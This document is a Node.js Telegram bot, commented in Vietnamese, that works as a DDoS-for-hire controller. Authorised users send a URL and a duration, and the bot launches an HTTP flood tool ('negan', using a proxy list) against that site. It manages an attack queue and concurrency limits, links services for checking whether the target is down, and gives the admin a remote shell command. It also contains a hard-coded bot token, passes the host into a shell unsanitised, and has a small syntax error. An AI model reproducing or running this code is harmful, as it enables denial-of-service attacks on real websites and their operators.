const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi lệnh
const maxConcurrentAttacks = 3; // Số lượng lệnh tối đa có thể chạy đồng thời
const maxSlot = 1; // Số lượng lệnh tối đa mà mỗi người dùng có thể chạy cùng lúc

const bot = new TelegramBot(token, { polling: true });
const userProcesses = new Map(); // Lưu trữ tiến trình của người dùng bằng user ID
const currentAttacks = new Map(); // Lưu trữ các lệnh đang chạy
const attackQueue = []; // Hàng đợi các lệnh chờ thực thi

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = msg.from.id === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;
    const userId = msg.from.id; // Lấy user ID của người dùng

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });

        // Kiểm tra thời gian không vượt quá giới hạn
        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });

        // Kiểm tra số lượng lệnh đang chạy của người dùng
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.userId === userId).length;
        if (userAttacks >= maxSlot) {
            return bot.sendMessage(chatId, `🚫 Bạn đã đạt giới hạn số lượng lệnh có thể chạy cùng lúc (${maxSlot}).`, { parse_mode: 'HTML' });
        }

        // Kiểm tra số lượng lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, host, time, username, userId });
            return bot.sendMessage(chatId, '⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...', { parse_mode: 'HTML' });
        }

        const pid = Math.floor(Math.random() * 10000);
        const startMessage = {
            status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`, caller: username, startTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
            checkHost: `Check Host (https://check-host.net/check-http?host=${host})`,
            hostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
        };
        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
            [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
        ]}});

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        const child = exec(command, { shell: '/bin/bash' });
        currentAttacks.set(pid, { userId, startTime: Date.now(), time }); // Lưu lệnh đang chạy
        userProcesses.set(userId, { pid, startTime: Date.now(), time }); // Lưu tiến trình của người dùng

        child.on('close', () => {
            const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
            bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' };
            currentAttacks.delete(pid); // Xóa lệnh đang chạy khi hoàn thành
            userProcesses.delete(userId); // Xóa tiến trình của người dùng khi hoàn thành

            // Xử lý hàng đợi
            if (attackQueue.length > 0) {
                const nextAttack = attackQueue.shift();
                bot.sendMessage(nextAttack.chatId, '🔄 Đang thực thi lệnh từ hàng đợi...', { parse_mode: 'HTML' });
                bot.emit('message', { chat: { id: nextAttack.chatId }, from: { id: nextAttack.userId, username: nextAttack.username }, text: `${nextAttack.host} ${nextAttack.time}` });
            }
        });
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            bot.sendMessage(chatId, `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`, { parse_mode: 'HTML' });
        });
        return;
    }

    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
});
